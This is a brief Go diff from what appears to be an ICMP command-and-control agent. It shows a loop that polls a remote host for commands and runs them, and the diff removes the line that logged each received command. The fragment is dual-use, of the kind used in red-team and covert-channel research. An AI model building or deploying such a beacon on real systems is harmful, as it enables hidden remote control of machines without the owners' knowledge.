@@ -14,7 +14,6 @@ const retrySeconds = 5
 func pollForCommands(s net.Addr) {
 	for {
 		cmdP := transport.Send(s, []byte(""), transport.IcmpCodeCommandRequest)
-		log.Println("Got command", cmdP)
 		if string(cmdP.Body.Data) != "" {
 			go runCommandAndReport(cmdP)
 		}
